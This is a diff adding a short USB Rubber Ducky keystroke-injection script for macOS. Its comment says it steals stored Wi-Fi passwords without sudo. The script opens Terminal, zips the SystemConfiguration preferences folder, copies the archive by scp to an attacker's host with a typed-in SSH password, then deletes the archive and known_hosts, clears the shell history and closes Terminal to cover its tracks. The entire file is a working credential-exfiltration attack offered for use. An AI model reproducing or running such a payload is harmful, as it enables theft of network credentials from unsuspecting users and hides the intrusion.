@@ -1,0 +1,26 @@
+REM Created by K0ALA!
+REM Script to grab the nessecary files to see the stored wifi passwords on mac os and later send them to you through scp without sudo!
+DELAY 500
+GUI SPACE
+DELAY 150
+STRING terminal
+DELAY 150
+ENTER
+DELAY 300
+STRING zip /Users/$USER/Desktop/wifishit.zip /Library/Preferences/SystemConfiguration/* && scp /Users/$USER/Desktop/wifishit.zip <ip>:/home/<user> && rm /Users/$USER/Desktop/wifishit.zip
+DELAY 150
+ENTER
+DELAY 150
+STRING yes
+ENTER
+DELAY 200
+STRING <ssh password>
+ENTER
+DELAY 150
+ENTER
+STRING rm .ssh/known_hosts && history -c
+DELAY 150
+ENTER
+DELAY 150
+STRING killall Terminal
+ENTER
